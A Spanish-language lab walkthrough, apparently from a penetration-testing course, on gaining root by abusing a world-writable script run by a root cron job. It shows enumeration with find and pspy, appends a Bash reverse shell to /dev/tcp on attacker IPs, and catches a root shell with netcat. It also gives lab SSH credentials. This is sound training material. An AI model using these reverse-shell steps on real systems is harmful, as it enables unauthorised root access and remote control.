
# Abuso de Cron

## <mark style="color:purple;">Cron Jobs</mark>

Los cron jobs también se pueden configurar para que se ejecuten una sola vez (por ejemplo, al iniciar el sistema). Por lo general, se utilizan para tareas administrativas, como ejecutar copias de seguridad, limpiar directorios, etc. El comando `crontab` puede crear un archivo cron, que será ejecutado por el daemon cron según el cronograma especificado. Cuando se crea, el archivo cron `/var/spool/cron` se crea para el usuario específico que lo crea. Cada entrada en el archivo crontab requiere seis elementos en el siguiente orden: minutos, horas, días, meses, semanas, comandos. Por ejemplo, la entrada `0 */12 * * * /home/admin/backup.sh` se ejecutaría cada 12 horas.

El crontab raíz casi siempre solo lo puede editar el usuario root o un usuario con privilegios completos de sudo; sin embargo, aún puede ser objeto de abuso. Es posible que encuentre un script que permita la escritura por parte de todo el mundo y que se ejecute como root e, incluso si no puede leer el crontab para conocer la programación exacta, es posible que pueda determinar la frecuencia con la que se ejecuta (es decir, un script de backup que crea un archivo `.tar.gz` cada 12 horas). En este caso, puede agregar un comando al final del script (como un comando de una sola línea de shell inverso) y se ejecutará la próxima vez que se ejecute el trabajo cron.

Algunas aplicaciones crean archivos cron en el directorio `/etc/cron.d` y pueden estar mal configuradas para permitir que un usuario no root los edite.

Primero, observemos el sistema para ver si hay archivos o directorios que permitan la escritura. El archivo `backup.sh` en el directorio `/dmz-backups` es interesante y parece que podría estar ejecutándose en una tarea de cron.

```shell-session
afsh4ck@htb$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

Una mirada rápida al directorio `/dmz-backups` muestra lo que parecen ser archivos creados cada tres minutos. Esto parece ser un error de configuración importante. Quizás el administrador del sistema quiso especificar cada tres horas, `0 */3 * * *` pero en su lugar escribió `*/3 * * * *`, lo que le indica al trabajo cron que se ejecute cada tres minutos. El segundo problema es que el script `backup.sh` puede ser escrito por todo el mundo y se ejecuta como root.

```shell-session
afsh4ck@htb$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

Podemos confirmar que se está ejecutando un trabajo cron utilizando [pspy](https://github.com/DominicBreuker/pspy) , una herramienta de línea de comandos que se utiliza para ver los procesos en ejecución sin necesidad de privilegios de root. Podemos utilizarla para ver los comandos ejecutados por otros usuarios, trabajos cron, etc. Funciona escaneando [procfs](https://en.wikipedia.org/wiki/Procfs) .

Vamos a ejecutar `pspy` y echarle un vistazo. La flag `-pf` le indica a la herramienta que imprima comandos y eventos del sistema de archivos y `-i 1000` que escanee [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) cada 1000 ms (o cada segundo).

```shell-session
afsh4ck@htb$ ./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

De la salida anterior, podemos ver que un trabajo cron ejecuta el script `backup.sh` ubicado en el directorio `/dmz-backups` y crea un archivo tarball con el contenido del directorio `/var/www/html`.

Podemos ver el script de shell y agregarle un comando para intentar obtener un reverse shell como root. Si editamos un script, asegúrese de `SIEMPRE` hacer una copia del script y/o crear una copia de seguridad del mismo. También deberíamos intentar agregar nuestros comandos al final del script para que se ejecute correctamente antes de ejecutar nuestro comando de shell inverso.

```shell-session
afsh4ck@htb$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Podemos ver que el script solo toma un directorio de origen y de destino como variables. Luego especifica un nombre de archivo con la fecha y hora actuales de la copia de seguridad y crea un archivo tar del directorio de origen, el directorio raíz web. Modifiquemos el script para agregar un [shell inverso de una sola línea de Bash](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) .

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Modificamos el script, creamos un listener con `netcat` y esperamos. En tres minutos, ¡ya tenemos un shell raíz!

```shell-session
afsh4ck@htb$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

Si bien no es el ataque más común, encontramos trabajos cron mal configurados que pueden ser objeto de abuso de vez en cuando.

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.80.5 (ACADEMY-LPE-NIX02)
User "htb-student"
Password "Academy_LLPE!"
```

Conéctese al sistema de destino y aumente los privilegios mediante el uso indebido del trabajo cron mal configurado. Envíe el contenido del archivo flag.txt en el directorio `/root/cron_abuse`.

### 1. Ver Cron Jobs activos

```shell-session
htb-student@NIX02:~$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/home/backupsvc/backup.sh
```

Encontramos algunos cron jobs interesantes cómo el `backup.sh`

```shell-session
htb-student@NIX02:~$ cat /dmz-backups/backup.sh 
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

El script hace lo siguiente:

1. Define el directorio de origen (`/var/www/html`) y el de destino (`/dmz-backups/`).
2. Crea un nombre de archivo único basado en la fecha y la hora actuales.
3. Usa `tar` para crear un archivo comprimido `tar.gz` de `/var/www/html` y lo guarda en `/dmz-backups/` con el nombre generado.

Si hacemos un `ls -la` en el directorio del script observamos que tenemos permisos de lectura y escritura sobre el script (se ejecuta como root) y que crea un archivo de backup cada 2 minutos, por lo que el script se está ejecutando correctamente:

```shell-session
htb-student@NIX02:~$ ls -la /dmz-backups/
total 1203180
drwxrwxrwx  2 root root    36864 Oct 10 15:14 .
drwxr-xr-x 25 root root     4096 Jan 25  2024 ..
-rwxrwxrwx  1 root root      189 Nov  6  2020 backup.sh
-rw-r--r--  1 root root 12966790 Nov  6  2020 www-backup-2020116-06:12:06.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:00 www-backup-20241010-15:00:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:02 www-backup-20241010-15:02:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:04 www-backup-20241010-15:04:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:06 www-backup-20241010-15:06:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:08 www-backup-20241010-15:08:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:10 www-backup-20241010-15:10:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:12 www-backup-20241010-15:12:01.tgz
-rw-r--r--  1 root root 12967830 Oct 10 15:14 www-backup-20241010-15:14:01.tgz
```

### 2. Editar el script

Ya que el script se ejecuta como root, vamos a explotarlo para elevar nuestros privilegios editando el script para introducir una reverse shell justo al final del archivo:

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.15.164/4444 0>&1
```

Podemos hacerlo con el siguiente comando:

```bash
echo 'bash -i >& /dev/tcp/10.10.15.164/4444 0>&1' >> /dmz-backups/backup.sh
```

Comprobamos el archivo para ver que se ha modificado correctamente incluyendo nuestra reverse shell:

```shell-session
htb-student@NIX02:/dmz-backups$ cat /dmz-backups/backup.sh 
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.15.164/4444 0>&1
```

### 3. Iniciamos listener con netcat

En este punto iniciamos un listener con netcat por el puerto 4444 (el que hemos especificado) en la reverse shell y esperamos 2 minutos hasta tener una conexión:

<figure><img src="/files/agsYb3Xvws1frNJhsABX" alt=""><figcaption></figcaption></figure>

Recibimos una shell como root y accedemos a la flag!
